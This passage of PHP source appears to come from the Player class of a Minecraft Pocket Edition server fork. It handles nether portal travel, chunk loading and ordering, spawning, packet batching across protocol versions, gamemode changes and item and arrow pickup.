		if($currentLevel->getDimension() === Level::DIMENSION_NORMAL){
			return $this->getNetherPortalLevel();
		}

		if($currentLevel->getDimension() === Level::DIMENSION_NETHER){
			$name = $this->server->getPortalWorldName();
			$level = $this->server->getLevelByName($name);
			if(!$this->isPortalLevelUsable($level) and $this->server->isLevelGenerated($name)){
				$this->server->loadLevel($name);
				$level = $this->server->getLevelByName($name);
			}
			return $this->isPortalLevelUsable($level) ? $level : null;
		}

		return null;
	}

	private function canUseNetherPortalHere() : bool{
		$currentLevel = $this->getLevel();
		return $currentLevel instanceof Level and $this->server->isNetherPortalWorld($currentLevel);
	}

	private function teleportThroughNetherPortal(Level $targetLevel) : bool{
		$target = NetherPortalHelper::convertPosBetweenNetherAndOverworld($this->getPosition(), $targetLevel);
		if(!($target instanceof Position)){
			return false;
		}

		$chunkX = ((int) floor($target->x)) >> 4;
		$chunkZ = ((int) floor($target->z)) >> 4;
		try{
			if(!$targetLevel->isChunkLoaded($chunkX, $chunkZ)){
				$targetLevel->loadChunk($chunkX, $chunkZ);
			}
		}catch(\Throwable $e){
			return false;
		}

		if(NetherPortalHelper::isPortalPosition($target)){
			$this->teleport($this->shouldResPos = $target->add(0.5, 0, 0.5));
			return true;
		}

		if(NetherPortalHelper::spawnPortal($target)){
			$this->teleport($this->shouldResPos = $target->add(1.5, 1, 1.5));
			return true;
		}

		return false;
	}

	private function updateNetherPortalTimer(bool $insidePortal){
		if(!$insidePortal){
			$this->portalTime = 0;
			$this->portalCooldown = false;
			return;
		}

		if($this->portalCooldown){
			$this->portalTime = 0;
			return;
		}

		if($this->portalTime == 0){
			$this->portalTime = $this->server->getTick();
		}
	}

	private function armNetherPortalCooldownAfterTransfer(){
		$this->portalTime = 0;
		$this->portalCooldown = true;
	}

	public function sendChunk($x, $z, $payload, $ordering = FullChunkDataPacket::ORDER_COLUMNS){
		if($this->connected === false){
			return;
		}

		$this->usedChunks[Level::chunkHash($x, $z)] = true;
		$this->chunkLoadCount++;

		if(is_array($payload) and isset($payload["payload"], $payload["ordering"])){
			if(isset($payload["currentProtocol"], $payload["currentProtocolBatch"])
				and (int) $payload["currentProtocol"] === (int) $this->protocol
				and $payload["currentProtocolBatch"] instanceof BatchPacket
			){
				$this->dataPacket($payload["currentProtocolBatch"]);
			}else{
				$ordering = $payload["ordering"];
				$payload = $payload["payload"];
				$pk = ProtocolCompatibility::isProtocol015((int) $this->protocol) ? new FullChunkDataPacketV84() : new FullChunkDataPacket();
				$pk->chunkX = $x;
				$pk->chunkZ = $z;
				$pk->order = $ordering;
				$pk->data = $payload;
				$this->batchDataPacket($pk);
			}
		}elseif($payload instanceof DataPacket or $payload instanceof DataPacketV84){
			$this->dataPacket($payload);
		}else{
			$pk = ProtocolCompatibility::isProtocol015((int) $this->protocol) ? new FullChunkDataPacketV84() : new FullChunkDataPacket();
			$pk->chunkX = $x;
			$pk->chunkZ = $z;
			$pk->order = $ordering;
			$pk->data = $payload;
			$this->batchDataPacket($pk);
		}

		if($this->spawned){
			foreach($this->level->getChunkEntities($x, $z) as $entity){
				if($entity !== $this and !$entity->closed and $entity->isAlive()){
					$entity->spawnTo($this);
				}
			}
		}
	}

	private function sendDimensionSpawnStatus(){
		if(!$this->shouldSendStatus){
			return;
		}

		$this->shouldSendStatus = false;

		$pk = new PlayStatusPacket();
		$pk->status = PlayStatusPacket::PLAYER_SPAWN;
		$this->dataPacket($pk);
	}

	protected function sendNextChunk(){
		if($this->connected === false){
			return;
		}

		Timings::$playerChunkSendTimer->startTiming();

		$count = 0;
		foreach($this->loadQueue as $index => $distance){
			if($count >= $this->chunksPerTick){
				break;
			}

			$X = null;
			$Z = null;
			Level::getXZ($index, $X, $Z);

			++$count;

			$this->usedChunks[$index] = false;
			$this->level->registerChunkLoader($this, $X, $Z, true);

			if(!$this->level->populateChunk($X, $Z)){
				if($this->spawned and $this->teleportPosition === null){
					continue;
				}else{
					break;
				}
			}

			unset($this->loadQueue[$index]);
			$this->level->requestChunk($X, $Z, $this);
			if(count($this->loadQueue) == 0){
				$this->sendDimensionSpawnStatus();
			}
		}

		if($this->chunkLoadCount >= $this->spawnThreshold and $this->spawned === false and $this->teleportPosition === null){
			$this->doFirstSpawn();
		}

		Timings::$playerChunkSendTimer->stopTiming();
	}

	protected function doFirstSpawn(){
		$this->spawned = true;

		$this->sendSettings();
		$this->sendPotionEffects($this);
		$this->sendData($this);
		$this->sendProtocol015LeashStateReset();

		$pk = new SetTimePacket();
		$pk->time = $this->level->getTime();
		$pk->started = $this->level->stopTime == false && !$this->server->isWorldDaylightCycleDisabled($this->level);
		$this->dataPacket($pk);

		$pos = $this->level->getSafeSpawn($this);

		$this->server->getPluginManager()->callEvent($ev = new PlayerRespawnEvent($this, $pos));

		$pos = $ev->getRespawnPosition();
		if($pos->getY() < 127) $pos = $pos->add(0, 0.2, 0);

		$pk = new RespawnPacket();
		$pk->x = $pos->x;
		$pk->y = $pos->y;
		$pk->z = $pos->z;
		$this->dataPacket($pk);

		$pk = new PlayStatusPacket();
		$pk->status = PlayStatusPacket::PLAYER_SPAWN;
		$this->dataPacket($pk);

		$this->noDamageTicks = 60;

		foreach($this->usedChunks as $index => $c){
			Level::getXZ($index, $chunkX, $chunkZ);
			foreach($this->level->getChunkEntities($chunkX, $chunkZ) as $entity){
				if($entity !== $this and !$entity->closed and $entity->isAlive()){
					$entity->spawnTo($this);
				}
			}
		}

		$this->teleport($pos);

		$this->server->getPluginManager()->callEvent($ev = new PlayerJoinEvent($this, new TranslationContainer(TextFormat::YELLOW . "%multiplayer.player.joined", [
			$this->getDisplayName()
		])));

		if(strlen(trim($msg = $ev->getJoinMessage())) > 0){
			if($this->server->playerMsgType === Server:: PLAYER_MSG_TYPE_MESSAGE) $this->server->broadcastMessage($msg);
			elseif($this->server->playerMsgType === Server::PLAYER_MSG_TYPE_TIP) $this->server->broadcastTip(str_replace("@player", $this->getName(), $this->server->playerLoginMsg));
			elseif($this->server->playerMsgType === Server::PLAYER_MSG_TYPE_POPUP) $this->server->broadcastPopup(str_replace("@player", $this->getName(), $this->server->playerLoginMsg));
		}
		$this->sendProtocol011AutoSprintJoinMessage();
		$this->sendProtocol011SneakJoinMessage();
		$this->syncProtocol011AutoSprintClientSpeed();

		$this->setAllowFlight($this->gamemode == 3 || $this->gamemode == 1);

		$this->server->onPlayerLogin($this);
		$this->spawnToAll();
		if($this->delayedCreativeGamemode !== null){
			$this->server->getScheduler()->scheduleDelayedTask(new CallbackTask([$this, "applyDelayedCreativeGamemode"]), 20);
		}
		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			$this->server->getScheduler()->scheduleDelayedTask(new CallbackTask([$this, "replaceLegacyPotionArrowsInInventory"]), 60);
		}

		$this->level->getWeather()->sendWeather($this);
		if($this->server->expEnabled){
			//$this->checkExpLevel();
			$this->updateExperience();
		}
		$this->setHealth($this->getHealth());
		if($this->server->foodEnabled) $this->setFood($this->getFood());
		else $this->setFood(20);

		if($this->server->dserverConfig["enable"] and $this->server->dserverConfig["queryAutoUpdate"]) $this->server->updateQuery();

		/*if($this->server->getUpdater()->hasUpdate() and $this->hasPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE)){
			$this->server->getUpdater()->showPlayerUpdate($this);
		}*/

		if($this->getHealth() <= 0){
			$pk = new RespawnPacket();
			$pos = $this->getSpawn();
			$pk->x = $pos->x;
			$pk->y = $pos->y;
			$pk->z = $pos->z;
			$this->dataPacket($pk);
		}

		$this->inventory->sendContents($this);
		$this->inventory->sendArmorContents($this);
	}

	public function scheduleRidingChunkRefresh(){
		if($this->nextChunkOrderRun > 0){
			$this->nextChunkOrderRun = 0;
		}
	}

	private function isRidingMinecart() : bool{
		$linked = $this->getLinkedEntity();
		return $linked instanceof Minecart || $linked instanceof MinecartChest || $linked instanceof MinecartHopper || $linked instanceof MinecartTNT;
	}

	protected function getChunkOrderCenter(){
		$linked = $this->getLinkedEntity();
		if($linked instanceof Minecart or $linked instanceof MinecartChest or $linked instanceof MinecartHopper or $linked instanceof MinecartTNT or $linked instanceof Pig or $linked instanceof Horse){
			if($linked->getLevel() === $this->level){
				return $linked;
			}
		}
		return $this;
	}

	protected function orderChunks(){
		if($this->connected === false){
			return false;
		}

		Timings::$playerChunkOrderTimer->startTiming();

		$this->nextChunkOrderRun = 200;

		$viewDistance = $this->server->getMemoryManager()->getViewDistance($this->viewDistance);

		$newOrder = [];
		$lastChunk = $this->usedChunks;

		$center = $this->getChunkOrderCenter();
		$centerX = ((int) floor($center->x)) >> 4;
		$centerZ = ((int) floor($center->z)) >> 4;

		$layer = 1;
		$leg = 0;
		$x = 0;
		$z = 0;

		for($i = 0; $i < $viewDistance; ++$i){

			$chunkX = $x + $centerX;
			$chunkZ = $z + $centerZ;

			if(!isset($this->usedChunks[$index = Level::chunkHash($chunkX, $chunkZ)]) or $this->usedChunks[$index] === false){
				$newOrder[$index] = true;
			}
			unset($lastChunk[$index]);

			switch($leg){
				case 0:
					++$x;
					if($x === $layer){
						++$leg;
					}
					break;
				case 1:
					++$z;
					if($z === $layer){
						++$leg;
					}
					break;
				case 2:
					--$x;
					if(-$x === $layer){
						++$leg;
					}
					break;
				case 3:
					--$z;
					if(-$z === $layer){
						$leg = 0;
						++$layer;
					}
					break;
			}
		}

		foreach($lastChunk as $index => $bool){
			Level::getXZ($index, $X, $Z);
			$this->unloadChunk($X, $Z);
		}

		$this->loadQueue = $newOrder;


		Timings::$playerChunkOrderTimer->stopTiming();

		return true;
	}

	/**
	 * Batch a Data packet into the channel list to send at the end of the tick
	 *
	 * @param DataPacket|DataPacketV84 $packet
	 *
	 * @return bool
	 */
	public function batchDataPacket(DataPacket|DataPacketV84 $packet){
		if($this->connected === false or $this->hasTransferred){
			return false;
		}

		if($this->shouldDropProtocol012ArrowTakeItemEntityPacket($packet)){
			return false;
		}

		if($packet instanceof DataPacket){
			$packet = $this->prepareProtocol013OutgoingPacket($packet);
		}

		$timings = Timings::getSendDataPacketTimings($packet);
		$timings->startTiming();
		if($this->remapComplexPacketForProtocol($packet, function($mappedPacket){
			$this->batchDataPacket($mappedPacket);
		})){
			$timings->stopTiming();
			return true;
		}
		$packet = DataPacketManager::parsePacket($this, $packet);
		if($packet === null){
			$timings->stopTiming();
			return false;
		}
		if($this->shouldDeferV84Packet($packet)){
			$timings->stopTiming();
			return $this->deferV84Packet($packet);
		}
		$this->server->getPluginManager()->callEvent($ev = new DataPacketSendEvent($this, $packet));
		if($ev->isCancelled()){
			$timings->stopTiming();
			return false;
		}

		if(!isset($this->batchedPackets)){
			$this->batchedPackets = [];
		}

		$this->batchedPackets[] = clone $packet;
		$timings->stopTiming();
		return true;
	}

	/**
	 * Sends an ordered DataPacket to the send buffer
	 *
	 * @param DataPacket|DataPacketV84 $packet
	 * @param bool                     $needACK
	 *
	 * @return int|bool
	 */
	public function dataPacket(DataPacket|DataPacketV84 $packet, $needACK = false){
		if(!$this->connected or $this->hasTransferred){
			return false;
		}

		if($this->shouldDropProtocol012ArrowTakeItemEntityPacket($packet)){
			return false;
		}

		if($packet instanceof DataPacket){
			$packet = $this->prepareProtocol013OutgoingPacket($packet);
		}

		$timings = Timings::getSendDataPacketTimings($packet);
		$timings->startTiming();
		if($this->remapComplexPacketForProtocol($packet, function($mappedPacket) use ($needACK){
			$this->dataPacket($mappedPacket, $needACK);
		})){
			$timings->stopTiming();
			return true;
		}
		$packet = DataPacketManager::parsePacket($this, $packet);
		if($packet === null){
			$timings->stopTiming();
			return false;
		}
		if($this->shouldDeferV84Packet($packet)){
			$timings->stopTiming();
			return $this->deferV84Packet($packet);
		}

		$this->server->getPluginManager()->callEvent($ev = new DataPacketSendEvent($this, $packet));
		if($ev->isCancelled()){
			$timings->stopTiming();
			return false;
		}

		$identifier = $this->interface->putPacket($this, $packet, $needACK, false);

		if($needACK and $identifier !== null){
			$this->needACK[$identifier] = false;

			$timings->stopTiming();
			return $identifier;
		}

		$timings->stopTiming();
		return true;
	}

	/**
	 * @param DataPacket|DataPacketV84 $packet
	 * @param bool                     $needACK
	 *
	 * @return bool|int
	 */
	public function directDataPacket(DataPacket|DataPacketV84 $packet, $needACK = false){
		if($this->connected === false or $this->hasTransferred){
			return false;
		}

		if($this->shouldDropProtocol012ArrowTakeItemEntityPacket($packet)){
			return false;
		}

		if($packet instanceof DataPacket){
			$packet = $this->prepareProtocol013OutgoingPacket($packet);
		}

		$timings = Timings::getSendDataPacketTimings($packet);
		$timings->startTiming();
		if($this->remapComplexPacketForProtocol($packet, function($mappedPacket) use ($needACK){
			$this->directDataPacket($mappedPacket, $needACK);
		})){
			$timings->stopTiming();
			return true;
		}
		$packet = DataPacketManager::parsePacket($this, $packet);
		if($packet === null){
			$timings->stopTiming();
			return false;
		}
		if($this->shouldDeferV84Packet($packet)){
			$timings->stopTiming();
			return $this->deferV84Packet($packet);
		}
		$this->server->getPluginManager()->callEvent($ev = new DataPacketSendEvent($this, $packet));
		if($ev->isCancelled()){
			$timings->stopTiming();
			return false;
		}

		$identifier = $this->interface->putPacket($this, $packet, $needACK, true);

		if($needACK and $identifier !== null){
			$this->needACK[$identifier] = false;

			$timings->stopTiming();
			return $identifier;
		}

		$timings->stopTiming();
		return true;
	}

	public function dataPacketProtocol011(DataPacketV11 $packet, $needACK = false, $immediate = false){
		if(!$this->connected or $this->hasTransferred or !$this->isProtocol011Player()){
			return false;
		}

		$timings = Timings::getSendDataPacketTimings($packet);
		$timings->startTiming();

		$this->server->getPluginManager()->callEvent($ev = new DataPacketSendEvent($this, $packet));
		if($ev->isCancelled()){
			$timings->stopTiming();
			return false;
		}

		$identifier = $this->interface->putPacket($this, $packet, $needACK, $immediate);
		if($needACK and $identifier !== null){
			$this->needACK[$identifier] = false;
			$timings->stopTiming();
			return $identifier;
		}

		$timings->stopTiming();
		return true;
	}

	protected function remapComplexPacketForProtocol($packet, callable $sender){
		if(!ProtocolCompatibility::isProtocol015((int) $this->protocol)){
			return false;
		}

		if($packet instanceof UpdateBlockPacket){
			foreach($packet->records as $record){
				$pk = new UpdateBlockPacketV84();
				$pk->x = $record[0];
				$pk->z = $record[1];
				$pk->y = $record[2];
				$pk->blockId = $record[3];
				$pk->blockData = $record[4];
				$pk->flags = $record[5];
				$sender($pk);
			}
			return true;
		}

		if($packet instanceof MoveEntityPacket){
			foreach($packet->entities as $entity){
				$pk = new MoveEntityPacketV84();
				$pk->eid = $entity[0];
				$pk->x = $entity[1];
				$pk->y = $entity[2];
				$pk->z = $entity[3];
				$pk->yaw = $entity[4];
				$pk->headYaw = $entity[5];
				$pk->pitch = $entity[6];
				$sender($pk);
			}
			return true;
		}

		return false;
	}

	/**
	 * @param Vector3 $pos
	 *
	 * @return boolean
	 */
	public function sleepOn(Vector3 $pos){
		if(!$this->isOnline()){
			return false;
		}

		foreach($this->level->getNearbyEntities($this->boundingBox->grow(2, 1, 2), $this) as $p){
			if($p instanceof Player){
				if($p->sleeping !== null and $pos->distance($p->sleeping) <= 0.1){
					return false;
				}
			}
		}

		$this->server->getPluginManager()->callEvent($ev = new PlayerBedEnterEvent($this, $this->level->getBlock($pos)));
		if($ev->isCancelled()){
			return false;
		}

		$this->sleeping = clone $pos;
		$this->teleport(new Position($pos->x + 0.5, $pos->y - 0.5, $pos->z + 0.5, $this->level));

		$this->setDataProperty(self::DATA_PLAYER_BED_POSITION, self::DATA_TYPE_POS, [$pos->x, $pos->y, $pos->z]);
		$this->setDataFlag(self::DATA_PLAYER_FLAGS, self::DATA_PLAYER_FLAG_SLEEP, true);

		$this->setSpawn($pos);

		$this->level->sleepTicks = 60;


		return true;
	}

	/**
	 * Sets the spawnpoint of the player (and the compass direction) to a Vector3, or set it on another world with a
	 * Position object
	 *
	 * @param Vector3|Position $pos
	 */
	public function setSpawn(Vector3 $pos){
		if(!($pos instanceof Position)){
			$level = $this->level;
		}else{
			$level = $pos->getLevel();
		}
		$this->spawnPosition = new Position($pos->x, $pos->y, $pos->z, $level);
		$pk = new SetSpawnPositionPacket();
		$pk->x = (int) $this->spawnPosition->x;
		$pk->y = (int) $this->spawnPosition->y;
		$pk->z = (int) $this->spawnPosition->z;
		$this->dataPacket($pk);
	}

	public function stopSleep(){
		if($this->sleeping instanceof Vector3){
			$this->server->getPluginManager()->callEvent($ev = new PlayerBedLeaveEvent($this, $this->level->getBlock($this->sleeping)));

			$this->sleeping = null;
			$this->setDataProperty(self::DATA_PLAYER_BED_POSITION, self::DATA_TYPE_POS, [0, 0, 0]);
			$this->setDataFlag(self::DATA_PLAYER_FLAGS, self::DATA_PLAYER_FLAG_SLEEP, false);


			$this->level->sleepTicks = 0;

			$pk = new AnimatePacket();
			$pk->eid = 0;
			$pk->action = 3; //Wake up
			$this->dataPacket($pk);
		}

	}

	/**
	 * @param string $achievementId
	 *
	 * @return bool
	 */
	public function awardAchievement($achievementId){
		if(isset(Achievement::$list[$achievementId]) and !$this->hasAchievement($achievementId)){
			foreach(Achievement::$list[$achievementId]["requires"] as $requerimentId){
				if(!$this->hasAchievement($requerimentId)){
					return false;
				}
			}
			$this->server->getPluginManager()->callEvent($ev = new PlayerAchievementAwardedEvent($this, $achievementId));
			if(!$ev->isCancelled()){
				$this->achievements[$achievementId] = true;
				Achievement::broadcast($this, $achievementId);

				return true;
			}else{
				return false;
			}
		}

		return false;
	}

	/**
	 * @return int
	 */
	public function getGamemode() : int{
		return $this->gamemode;
	}

	/**
	 * Sets the gamemode, and if needed, kicks the Player.
	 *
	 * @param int $gm
	 *
	 * @return bool
	 */
	public function setGamemode(int $gm){
		if($gm < 0 or $gm > 3 or $this->gamemode === $gm){
			return false;
		}

		$this->server->getPluginManager()->callEvent($ev = new PlayerGameModeChangeEvent($this, $gm));
		if($ev->isCancelled()){
			return false;
		}

		if($this->server->autoClearInv) $this->inventory->clearAll();

		$this->gamemode = $gm;

		$this->allowFlight = $this->isCreative() || $this->isSpectator();
		$this->keepMovement = $this->isSpectator();

		if($this->isSpectator()){
			$this->despawnFromAll();
		}else{
			$this->spawnToAll();
		}

		$this->namedtag->playerGameType = new IntTag("playerGameType", $this->gamemode);

		/*$spawnPosition = $this->getSpawn();

		$pk = new StartGamePacket();
		$pk->seed = -1;
		$pk->x = $this->x;
		$pk->y = $this->y;
		$pk->z = $this->z;
		$pk->spawnX = (int)$spawnPosition->x;
		$pk->spawnY = (int)$spawnPosition->y;
		$pk->spawnZ = (int)$spawnPosition->z;
		$pk->generator = 1; //0 old, 1 infinite, 2 flat
		$pk->gamemode = $this->gamemode & 0x01;
		$pk->eid = 0;*/
		$pk = new SetPlayerGameTypePacket();
		$pk->gamemode = $this->gamemode & 0x01;
		$this->dataPacket($pk);
		$this->sendSettings();

		$this->dataPacket($this->createCreativeInventoryPacket());

		$this->inventory->sendContents($this);
		$this->inventory->sendContents($this->getViewers());
		$this->inventory->sendHeldItem($this->hasSpawned);
		return true;
	}

	public function applyDelayedCreativeGamemode(CallbackTask $task = null){
		if(!$this->connected or $this->closed or $this->delayedCreativeGamemode === null){
			return;
		}

		$gamemode = $this->delayedCreativeGamemode;
		$this->delayedCreativeGamemode = null;

		if($this->gamemode === Player::SURVIVAL){
			$this->setGamemode($gamemode);
		}
	}

	/**
	 * Sends all the option flags
	 */
	public function sendSettings(){
		/*
		 bit mask | flag name
		0x00000001 world_inmutable
		0x00000002 no_pvp
		0x00000004 no_pvm
		0x00000008 no_mvp
		0x00000010 static_time
		0x00000020 nametags_visible
		0x00000040 auto_jump
		0x00000080 allow_fly
		0x00000100 noclip
		0x00000200 ?
		0x00000400 ?
		0x00000800 ?
		0x00001000 ?
		0x00002000 ?
		0x00004000 ?
		0x00008000 ?
		0x00010000 ?
		0x00020000 ?
		0x00040000 ?
		0x00080000 ?
		0x00100000 ?
		0x00200000 ?
		0x00400000 ?
		0x00800000 ?
		0x01000000 ?
		0x02000000 ?
		0x04000000 ?
		0x08000000 ?
		0x10000000 ?
		0x20000000 ?
		0x40000000 ?
		0x80000000 ?
		*/
		$flags = $this->getAdventureSettingsFlags(false);

		$pk = new AdventureSettingsPacket();
		$pk->flags = $flags;
		$pk->userPermission = 2;
		$pk->globalPermission = 2;
		$this->dataPacket($pk);
	}

	public function isSurvival() : bool{
		return ($this->gamemode & 0x01) === 0;
	}

	public function isCreative() : bool{
		return ($this->gamemode & 0x01) > 0;
	}

	public function isSpectator() : bool{
		return $this->gamemode === 3;
	}

	public function isAdventure() : bool{
		return ($this->gamemode & 0x02) > 0;
	}

	public function getDrops() : array{
		if(!$this->isCreative()){
			return parent::getDrops();
		}

		return [];
	}

	/**
	 * @deprecated
	 * @param $entityId
	 * @param $x
	 * @param $y
	 * @param $z
	 */
	public function addEntityMotion($entityId, $x, $y, $z){

	}

	/**
	 * @deprecated
	 * @param      $entityId
	 * @param      $x
	 * @param      $y
	 * @param      $z
	 * @param      $yaw
	 * @param      $pitch
	 * @param null $headYaw
	 */
	public function addEntityMovement($entityId, $x, $y, $z, $yaw, $pitch, $headYaw = null){

	}

	public function setDataProperty($id, $type, $value){
		if(parent::setDataProperty($id, $type, $value)){
			$this->sendData($this, [$id => $this->dataProperties[$id]]);
			return true;
		}

		return false;
	}

	protected function checkGroundState($movX, $movY, $movZ, $dx, $dy, $dz){
		$this->isCollidedVertically = $movY != $dy;
		$this->isCollidedHorizontally = ($movX != $dx or $movZ != $dz);
		$this->isCollided = ($this->isCollidedHorizontally or $this->isCollidedVertically);

		if($this->isCollidedVertically and $movY < 0){
			$this->onGround = true;
		}elseif(!$this->onGround or $movY != 0){
			$bb = clone $this->boundingBox;
			$bb->maxY = $bb->minY;
			$bb->minY -= 0.01;
			if(count($this->level->getCollisionBlocks($bb, true)) > 0){
				$this->onGround = true;
			}else{
				$this->onGround = false;
			}
		}
	}

	protected function normalizeCarpetGroundMovement(Vector3 $newPos){
		return $this->normalizePartialBlockGroundMovement($newPos);
	}

	protected function normalizePartialBlockGroundMovement(Vector3 $newPos){
		if($this->level === null){
			return $newPos;
		}
		if($this->onGround and abs($newPos->y - $this->y) <= self::THIN_BLOCK_GROUND_EPSILON){
			return $newPos;
		}

		$radius = $this->width / 2;
		$probe = new AxisAlignedBB(
			$newPos->x - $radius,
			$newPos->y - self::PARTIAL_BLOCK_GROUND_EPSILON,
			$newPos->z - $radius,
			$newPos->x + $radius,
			$newPos->y + self::PARTIAL_BLOCK_GROUND_EPSILON,
			$newPos->z + $radius
		);
		$minX = Math::floorFloat($probe->minX);
		$maxX = Math::ceilFloat($probe->maxX);
		$minY = Math::floorFloat($probe->minY);
		$maxY = Math::ceilFloat($probe->maxY);
		$minZ = Math::floorFloat($probe->minZ);
		$maxZ = Math::ceilFloat($probe->maxZ);
		$highestTop = null;

		for($x = $minX; $x <= $maxX; ++$x){
			for($y = $minY; $y <= $maxY; ++$y){
				for($z = $minZ; $z <= $maxZ; ++$z){
					$block = $this->level->getBlock($this->temporalVector->setComponents($x, $y, $z));
					if($block->getId() === Block::AIR){
						continue;
					}

					foreach($block->getCollisionBoxes($probe) as $bb){
						if(!$this->playerFootprintIntersects($newPos, $bb)){
							continue;
						}

						if($this->shouldNormalizePlayerFootToSupportTop($newPos->y, $bb)){
							$highestTop = $highestTop === null ? $bb->maxY : max($highestTop, $bb->maxY);
						}
					}
				}
			}
		}

		if($highestTop !== null and abs($newPos->y - $highestTop) > 0.0000001){
			return new Vector3($newPos->x, $highestTop, $newPos->z);
		}

		return $newPos;
	}

	protected function shouldNormalizePlayerFootToSupportTop($footY, AxisAlignedBB $bb){
		$topDelta = $footY - $bb->maxY;
		if(abs($topDelta) <= self::THIN_BLOCK_GROUND_EPSILON){
			return true;
		}

		if($topDelta < 0 and -$topDelta <= self::PARTIAL_BLOCK_GROUND_EPSILON and $footY >= $bb->minY - self::THIN_BLOCK_GROUND_EPSILON){
			return true;
		}

		if($topDelta > 0 and $topDelta <= self::PARTIAL_BLOCK_GROUND_EPSILON){
			$fullBlockTop = ceil($bb->maxY - self::THIN_BLOCK_GROUND_EPSILON);
			if(abs($footY - $fullBlockTop) <= self::THIN_BLOCK_GROUND_EPSILON){
				return true;
			}
		}

		return false;
	}

	protected function playerFootprintIntersects(Vector3 $pos, AxisAlignedBB $bb){
		$radius = $this->width / 2;
		return ($pos->x + $radius) > $bb->minX and ($pos->x - $radius) < $bb->maxX and ($pos->z + $radius) > $bb->minZ and ($pos->z - $radius) < $bb->maxZ;
	}

	protected function checkBlockCollision(){
		foreach($blocksaround = $this->getBlocksAround() as $block){
			$block->onEntityCollide($this);
			if($this->getServer()->redstoneEnabled){
				if($block instanceof PressurePlate){
					$this->activatedPressurePlates[Level::blockHash($block->x, $block->y, $block->z)] = $block;
				}
			}
		}

		if($this->getServer()->redstoneEnabled){
			/** @var \lycore\block\PressurePlate $block * */
			foreach($this->activatedPressurePlates as $key => $block){
				if(!isset($blocksaround[$key])) $block->checkActivation();
			}
		}
	}

	private function normalizeItemForThisProtocol(Item $item) : Item{
		return ProtocolCompatibility::normalizeClientItemForProtocol((int) $this->protocol, $item);
	}

	private function normalizeCreativeItemForThisProtocol(Item $item) : Item{
		return ProtocolCompatibility::normalizeCreativeItemForProtocol((int) $this->protocol, $item);
	}

	private function mapItemForThisProtocol(Item $item) : Item{
		return ProtocolCompatibility::mapItemForProtocol((int) $this->protocol, $item, false);
	}

	private function getCreativeUseItemForProtocol(Item $heldItem, $packetItem) : Item{
		if(!$packetItem instanceof Item or $packetItem->getId() === Item::AIR or $packetItem->getCount() <= 0){
			return $heldItem;
		}

		$normalizedItem = $this->normalizeCreativeItemForThisProtocol($packetItem);
		if(Item::getCreativeItemIndex($normalizedItem) !== -1 or $this->getCreativeItemIndex($normalizedItem) !== -1){
			return $normalizedItem;
		}

		if(Item::getCreativeItemIndex($packetItem) !== -1 or $this->getCreativeItemIndex($packetItem) !== -1){
			return $packetItem;
		}

		return $heldItem;
	}

	public function replaceLegacyPotionArrowsInInventory(CallbackTask $task = null){
		if(!ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) or !$this->spawned or $this->closed){
			return;
		}

		$this->inventory->sendContents($this);
	}

	private function findBowArrowItem(){
		foreach($this->inventory->getContents() as $item){
			if($item instanceof \lycore\item\Arrow and $item->getCount() > 0){
				return clone $item;
			}
			if($item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
				$normalized = ProtocolCompatibility::normalizeClientItemForProtocol((int) $this->protocol, $item);
				if($normalized instanceof \lycore\item\Arrow and $normalized->getCount() > 0){
					return clone $item;
				}
			}
		}

		return null;
	}

	private function consumeBowArrowItem(Item $arrowItem) : bool{
		$consume = clone $this->normalizeItemForThisProtocol($arrowItem);
		$consume->setCount(1);
		$remaining = $this->inventory->removeItem($consume);
		if(count($remaining) === 0){
			return true;
		}

		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			$consume = clone $arrowItem;
			$consume->setCount(1);
			$remaining = $this->inventory->removeItem($consume);
		}

		return count($remaining) === 0;
	}

	private function convertArrowPickupItem(Arrow $entity) : Item{
		$item = $entity->getArrowItem();
		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $item instanceof \lycore\item\Arrow and $item->isTipped()){
			return $item->toLegacyTippedArrowSurrogate();
		}

		return $item;
	}
	protected function checkNearEntities($tickDiff){
		foreach($this->level->getNearbyEntities($this->boundingBox->grow(0.5, 0.5, 0.5), $this) as $entity){
			$entity->scheduleUpdate();

			if(!$entity->isAlive()){
				continue;
			}

			if($entity instanceof Arrow and $entity->hadCollision){
				if(!$entity->canBePickedUpByPlayers()){
					continue;
				}
				$item = $this->convertArrowPickupItem($entity);
				if($this->isSurvival() and !$this->inventory->canAddItem($item)){
					continue;
				}

				$this->server->getPluginManager()->callEvent($ev = new InventoryPickupArrowEvent($this->inventory, $entity));
				if($ev->isCancelled()){
					continue;
				}
				
				//原注��?
				$pk = new TakeItemEntityPacket();
				$pk->eid = $this->getId();
				$pk->target = $entity->getId();
				Server::broadcastPacket($entity->getViewers(), $pk);

				$pk = new TakeItemEntityPacket();
				$pk->eid = 0;
				$pk->target = $entity->getId();
				$this->dataPacket($pk);
				//This may cause client crash
				//原注��?
				if(!$this->isCreative()) $this->inventory->addItem(clone $entity->getArrowItem());
				$entity->kill();
			}elseif($entity instanceof DroppedItem){
				if($entity->getPickupDelay() <= 0){
					$item = $entity->getItem();

					if($item instanceof Item){
						$pickupItem = $this->mapItemForThisProtocol($item);
						$itemMeta = $pickupItem->getDamage();
						if($pickupItem->getId() === Item::AIR or $pickupItem->getCount() <= 0 or (ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $pickupItem->getId(), $itemMeta === null ? 0 : (int) $itemMeta))){
							continue;
						}

						if($this->isSurvival() and !$this->inventory->canAddItem($item)){
							continue;
						}

						$this->server->getPluginManager()->callEvent($ev = new InventoryPickupItemEvent($this->inventory, $entity));
						if($ev->isCancelled()){
							continue;
						}

						switch($item->getId()){
							case Item::WOOD:
								$this->awardAchievement("mineWood");
								break;
							case Item::DIAMOND:
								$this->awardAchievement("diamond");
								break;
						}

						$pk = new TakeItemEntityPacket();
						$pk->eid = $this->getId();
						$pk->target = $entity->getId();
						Server::broadcastPacket($entity->getViewers(), $pk);

						$pk = new TakeItemEntityPacket();
						$pk->eid = 0;
						$pk->target = $entity->getId();
						$this->dataPacket($pk);

						$this->inventory->addItem(clone $item);
						$entity->kill();
					}
				}
			}
		}
	}

	protected function processMovement($tickDiff){
		if(!$this->isAlive() or !$this->spawned or $this->newPosition === null or $this->teleportPosition !== null){
			$this->setMoving(false);
			return;
		}

